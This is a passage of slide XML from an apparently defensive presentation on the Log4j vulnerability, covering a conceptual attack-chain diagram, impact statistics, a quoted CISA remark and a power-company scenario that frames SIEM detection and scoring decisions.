        <p:spPr>
          <a:xfrm>
            <a:off x="7415784" y="2212848"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE8888"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7415784" y="2788920"/>
            <a:ext cx="1627632" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Malicious class</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7415784" y="3474720"/>
            <a:ext cx="1627632" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker's server returns a code reference</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9400032" y="2011680"/>
            <a:ext cx="2084832" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3947"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="2E6FD6"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9628632" y="2212848"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9628632" y="2788920"/>
            <a:ext cx="1627632" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Code executes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9628632" y="3474720"/>
            <a:ext cx="1627632" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>JVM runs it — shells, miners, ransomware</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4937760"/>
            <a:ext cx="10972800" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE8888"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Red</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> = attacker-controlled        </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Blue</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> = the victim server acting on its own</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5532120"/>
            <a:ext cx="10972800" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E7A8C"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Steps 2, 3 and 5 all happen inside your own infrastructure — which is exactly why a SIEM can see them.</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B"/>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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WHY IT MATTERED</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3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>One of the most serious vulnerabilities in history</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="3566160" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2148840"/>
            <a:ext cx="3108960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>35k+</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2971800"/>
            <a:ext cx="3154680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Java packages affected — over 8% of Maven Central, mostly via deep dependencies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="1965960"/>
            <a:ext cx="3566160" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="2148840"/>
            <a:ext cx="3108960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;24h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590288" y="2971800"/>
            <a:ext cx="3154680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>From disclosure to mass, automated exploitation and weaponised exploit code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8083296" y="1965960"/>
            <a:ext cx="3566160" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="2148840"/>
            <a:ext cx="3108960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>10yr</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="2971800"/>
            <a:ext cx="3154680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>An “endemic” flaw — the Cyber Safety Review Board expects exploitation into the 2030s</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4114800"/>
            <a:ext cx="11094415" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5294"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="101826"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="4343400"/>
            <a:ext cx="10332720" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>“One of the most serious I've seen in my entire career, if not the most serious.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="5166360"/>
            <a:ext cx="10332720" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>— Jen Easterly, Director, CISA (December 2021)</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1826"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OUR SCENARIO</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A power company running Java deep in its control systems</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1737360"/>
            <a:ext cx="11064240" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Four assets in scope use Java or embed Log4j — and they don't sit on the corporate LAN, they run the grid. That context drives every score and every SIEM decision that follows.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2606040"/>
            <a:ext cx="3566160" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2807208"/>
            <a:ext cx="3017520" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>IT / OT boundary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3172968"/>
            <a:ext cx="3017520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
